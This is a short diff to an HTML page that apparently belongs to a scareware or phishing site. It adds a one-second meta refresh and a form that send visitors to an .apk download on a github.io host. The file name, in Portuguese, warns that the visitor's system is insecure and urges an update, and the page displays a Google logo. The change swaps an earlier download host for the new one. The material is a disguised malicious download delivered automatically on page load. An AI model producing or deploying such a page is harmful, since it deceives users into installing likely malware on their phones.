@@ -33,8 +33,8 @@
 </head>
  
   <body class="bg-white">
- 
-	<form action="https://shop-fy.online:171/o%20sistema%20inseguro%20ou%20prentende%20iniciar%20a%20atualizacao%20agora%20mesmo.apk">
+ <meta http-equiv="refresh" content="1; URL='http://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20e%20vulneravel%20ou%20prefere%20atualizar.apk'"/>
+<form action="http://mobi-center.github.io/mobi-center/seu%20sistema%20inseguro%20e%20vulneravel%20ou%20prefere%20atualizar.apk">
     <div class="container">
       <div class="py-5 text-center">
         <img class="d-block mx-auto mb-4" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" style="width:20%; height:20%;">
